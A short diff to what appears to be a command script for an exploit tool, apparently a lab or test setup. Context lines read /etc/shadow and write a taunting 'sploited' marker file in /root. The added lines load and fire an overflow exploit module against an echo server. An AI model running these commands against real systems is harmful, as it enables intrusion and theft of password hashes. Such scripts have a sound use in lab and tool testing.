@@ -13,3 +13,9 @@ cat /etc/shadow
 touch /root/sploited.txt
 gnome-terminal -- tail -f -n 1 /root/sploited.txt
 echo "You have been sploited :)" >> /root/sploited.txt
+load linux_x64_ovrflwmyechosrv
+show help
+help pwn
+load linux_x64_ovrflwmyechosrv
+help pwn
+pwn
